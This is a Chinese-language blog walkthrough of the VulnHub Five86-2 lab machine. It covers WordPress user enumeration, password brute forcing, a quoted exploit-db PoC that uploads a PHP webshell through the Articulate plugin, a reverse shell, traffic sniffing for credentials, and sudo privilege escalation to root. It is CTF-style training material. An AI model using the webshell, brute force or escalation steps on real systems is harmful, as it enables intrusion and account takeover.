---
title: "VulnHub-Five86-2"
layout: post
date: 2022-1-03 22:49
image: 
headerImage: false
tag:
- web
- vulnhub
category: blog
author: NoThxJ
description: VulnHub
---



环境下载地址：<https://www.five86.com/five86-2.html>



环境搭建：

![1](https://havocykp.github.io/assets/images/img_blog13/1.png)

信息收集

探测目标IP

目标IP为：192.168.101.200

```javascript
┌─[✗]─[root@pendo]─[~]
└──╼ #arp-scan -l
```

![2](https://havocykp.github.io/assets/images/img_blog13/2.png)

```javascript
┌─[root@pendo]─[~]
└──╼ #netdiscover -r 192.168.101.0/24
```

![3](https://havocykp.github.io/assets/images/img_blog13/3.png)

```javascript
┌─[root@pendo]─[~]
└──╼ #nmap -sP 192.168.101.0/24
```

![4](https://havocykp.github.io/assets/images/img_blog13/4.png)

端口扫描

```javascript
┌─[✗]─[root@pendo]─[~]
└──╼ #nmap -sT -sV -A -T5 192.168.101.200 -p-
```

通过综合端口扫描发现开放了20、21和80端口

CMS：WordPress 5.1.4

![5](https://havocykp.github.io/assets/images/img_blog13/5.png)

访问80端口

<http://192.168.101.200/>

![6](https://havocykp.github.io/assets/images/img_blog13/6.png)

插件识别

![7](https://havocykp.github.io/assets/images/img_blog13/7.png)

在 /etc/hosts文件中配置 （DNS域名配置）

![8](https://havocykp.github.io/assets/images/img_blog13/8.png)

重新访问，发现排版不一样了

![9](https://havocykp.github.io/assets/images/img_blog13/9.png)

点击 Log in，发现管理后台登录

![10](https://havocykp.github.io/assets/images/img_blog13/10.png)

因为虚拟机关闭，重新打开后目标IP变为：192.168.101.213



漏洞发现与利用

搜索 历史漏洞没有发现可提权利用

![11](https://havocykp.github.io/assets/images/img_blog13/11.png)

使用wpscan工具对WordPress扫描，默认扫描会返回目标站点的中间件、XML-RPC、readme文件、上传路径、WP-Corn、版本、主题、所有的插件和备份文件

```javascript
┌─[root@pendo]─[~]
└──╼ #wpscan --url http://192.168.101.213
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.101.213/ [192.168.101.213]
[+] Started: Sun Nov 21 14:38:47 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.101.213/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.101.213/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.101.213/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.101.213/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.4 identified (Insecure, released on 2020-04-29).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.101.213/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.1.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.101.213/, Match: 'WordPress 5.1.4'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <> (15 / 137) 10.94%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (21 / 137) 15.32%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (27 / 137) 19.70%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (32 / 137) 23.35%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (39 / 137) 28.46%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (44 / 137) 32.11%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (50 / 137) 36.49%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (55 / 137) 40.14%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (60 / 137) 43.79%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (65 / 137) 47.44%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (73 / 137) 53.28%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (78 / 137) 56.93%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (83 / 137) 60.58%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (90 / 137) 65.69%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (96 / 137) 70.07%  ETA: 00:00:0 Checking Config Backups - Time: 00:00:00 <> (101 / 137) 73.72%  ETA: 00:00: Checking Config Backups - Time: 00:00:00 <> (108 / 137) 78.83%  ETA: 00:00: Checking Config Backups - Time: 00:00:00 <> (114 / 137) 83.21%  ETA: 00:00: Checking Config Backups - Time: 00:00:00 <> (119 / 137) 86.86%  ETA: 00:00: Checking Config Backups - Time: 00:00:00 <> (125 / 137) 91.24%  ETA: 00:00: Checking Config Backups - Time: 00:00:00 <> (130 / 137) 94.89%  ETA: 00:00: Checking Config Backups - Time: 00:00:00 <> (136 / 137) 99.27%  ETA: 00:00: Checking Config Backups - Time: 00:00:00 <> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Nov 21 14:38:50 2021
[+] Requests Done: 139
[+] Cached Requests: 29
[+] Data Sent: 35.489 KB
[+] Data Received: 19.865 KB
[+] Memory used: 187.367 MB
[+] Elapsed time: 00:00:03
```

这里并没有发现有用的信息，考虑枚举用户名

经扫描，发现5个用户

```javascript
┌─[root@pendo]─[~]
└──╼ #wpscan --url http://192.168.101.213 --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.101.213/ [192.168.101.213]
[+] Started: Sun Nov 21 14:42:46 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.101.213/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.101.213/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.101.213/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.101.213/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.4 identified (Insecure, released on 2020-04-29).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.101.213/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.1.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.101.213/, Match: 'WordPress 5.1.4'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] gillian
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] barney
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] stephen
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Nov 21 14:42:50 2021
[+] Requests Done: 32
[+] Cached Requests: 28
[+] Data Sent: 8.322 KB
[+] Data Received: 80.377 KB
[+] Memory used: 128.688 MB
[+] Elapsed time: 00:00:03

```

根据枚举的用户名，配合rockyou.txt密码字典爆破口令

最终爆破出来两个结果：

```javascript
┌─[✗]─[root@pendo]─[/home/pendo]
└──╼ #wpscan --url http://192.168.101.213 -U usr.txt -P /usr/share/wordlists/rockyou.txt

 | Username: barney, Password: spooky1
 | Username: stephen, Password: apollo1

```

![12](https://havocykp.github.io/assets/images/img_blog13/12.png)

使用爆破的账号/密码登录WordPress后台

① 使用 barney账户登录，可以看到这个站点安装了三个插件，但是只激活了一个

**Insert or Embed Articulate Content into WordPress Trial Version 4.2995**

![13](https://havocykp.github.io/assets/images/img_blog13/13.png)

![14](https://havocykp.github.io/assets/images/img_blog13/14.png)

根据提示，发现有可用的插件更新（依据插件版本找寻是否存在漏洞点）

![15](https://havocykp.github.io/assets/images/img_blog13/15.png)

② 使用stephen登录，发现能操作的功能很少

![16](https://havocykp.github.io/assets/images/img_blog13/16.png)

在Google上直接搜索插件名，发现在 exploit-db有相关信息

![17](https://havocykp.github.io/assets/images/img_blog13/17.png)

exploit-db说明了具体的操作步骤：

```javascript
# Exploit Title: Authenticated code execution in `insert-or-embed-articulate-content-into-wordpress` Wordpress plugin
# Description: It is possible to upload and execute a PHP file using the plugin option to upload a zip archive 
# Date: june 2019
# Exploit Author: xulchibalraa
# Vendor Homepage: https://wordpress.org/plugins/insert-or-embed-articulate-content-into-wordpress/
# Software Link: https://downloads.wordpress.org/plugin/insert-or-embed-articulate-content-into-wordpress.4.2995.zip
# Version: 4.2995 <= 4.2997 
# Tested on: Wordpress 5.1.1, PHP 5.6 
# CVE : -


## 1. Create a .zip archive with 2 files: index.html, index.php

echo "<html>hello</html>" > index.html
echo "<?php echo system($_GET['cmd']); ?>" > index.php
zip poc.zip index.html index.php 

## 2. Log in to wp-admin with any user role that has access to the plugin functionality (by default even `Contributors` role have access to it)
## 3. Create a new Post -> Select `Add block` -> E-Learning -> Upload the poc.zip -> Insert as: Iframe -> Insert (just like in tutorial https://youtu.be/knst26fEGCw?t=44 ;)
## 4. Access the webshell from the URL displayed after upload similar to 

http://website.com/wp-admin/uploads/articulate_uploads/poc/index.php?cmd=whoami
```

![18](https://havocykp.github.io/assets/images/img_blog13/18.png)

按照步骤生成相关文件

![19](https://havocykp.github.io/assets/images/img_blog13/19.png)

登录WordPress后台，选择新建文章

![20](https://havocykp.github.io/assets/images/img_blog13/20.png)

添加block，选择e-Learning

![21](https://havocykp.github.io/assets/images/img_blog13/21.png)

上传poc

![22](https://havocykp.github.io/assets/images/img_blog13/22.png)

![23](https://havocykp.github.io/assets/images/img_blog13/23.png)

选择 Insert As iFrame

![24](https://havocykp.github.io/assets/images/img_blog13/24.png)

获取文件上传地址

/wp-content/uploads/articulate_uploads/poc/index.html

![25](https://havocykp.github.io/assets/images/img_blog13/25.png)

反弹shell（注：使用网上的方法上传后，无法反弹shell，使用parrot自带的webshell文件）

攻击机监听：

![26](https://havocykp.github.io/assets/images/img_blog13/26.png)

```javascript
┌─[root@pendo]─[~]
└──╼ #nc -lvvp 9999
```

访问：

<http://192.168.101.213/wp-content/uploads/articulate_uploads/poc/shell.php>

![27](https://havocykp.github.io/assets/images/img_blog13/27.png)

```javascript
切换TTY交互：

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@five86-2:/$ 
```

ls /home 发现有8个目录，刚才爆破了两个账号的密码

![28](https://havocykp.github.io/assets/images/img_blog13/28.png)

尝试sudo -l ，输入密码 spooky1 失败

![29](https://havocykp.github.io/assets/images/img_blog13/29.png)

切换别的用户：su stephen 输入密码 apollo1，执行成功，发现stephen在一个名为pcap的用户组中（pcap不是流量包吗？？？）

![30](https://havocykp.github.io/assets/images/img_blog13/30.png)

执行 sudo -l 发现无法执行

![31](https://havocykp.github.io/assets/images/img_blog13/31.png)

回到pcap那里，流量包是不是意味着流量分析，尝试 ifconfig，发现没有这个命令，但是可以使用 ip add，发现目前运行的几个网络接口
![32](https://havocykp.github.io/assets/images/img_blog13/32.png)

使用tcpdump -D列出可用于抓包的接口

![33](https://havocykp.github.io/assets/images/img_blog13/33.png)

切换目录到 /tmp，抓包

抓包命令为timeout 120 tcpdump -w 1.pcap -i br-eca3858d86bf，其中timeout 120是指2分钟，-w是将结果输出到文件，-i是指定监听端口

stephen@five86-2:/tmp$ timeout 120 tcpdump -w 2.pcap -i vethea5122d

使用命令 tcpdump -r 1.pcap 分析流量包，-r 是从给定的流量包读取数据

发现 USER: paul  PASS：esomepasswford

![34](https://havocykp.github.io/assets/images/img_blog13/34.png)

su paul，用获取的密码登录。

sudo -l ，发现stephen用户可以使用peter的service命令

![35](https://havocykp.github.io/assets/images/img_blog13/35.png)

直接执行 peter的 /bin/bash

命令：sudo -u peter service /bin/bash（最后用相对目录找到/bin/bash位置）

![36](https://havocykp.github.io/assets/images/img_blog13/36.png)

看了大佬文章后，发现他使用了 gtfo 工具发现了相对目录

截图来自：<https://blog.mzfr.me/vulnhub-writeups/2020-01-09-five862>

sudo -u peter service ../../bin/bash

![37](https://havocykp.github.io/assets/images/img_blog13/37.png)

获取peter的权限后，先sudo -l，发现可以运行root用户的passwd命令

![38](https://havocykp.github.io/assets/images/img_blog13/38.png)

修改root用户密码

sudo -u root passwd root

![39](https://havocykp.github.io/assets/images/img_blog13/39.png)

找到flag

![40](https://havocykp.github.io/assets/images/img_blog13/40.png)

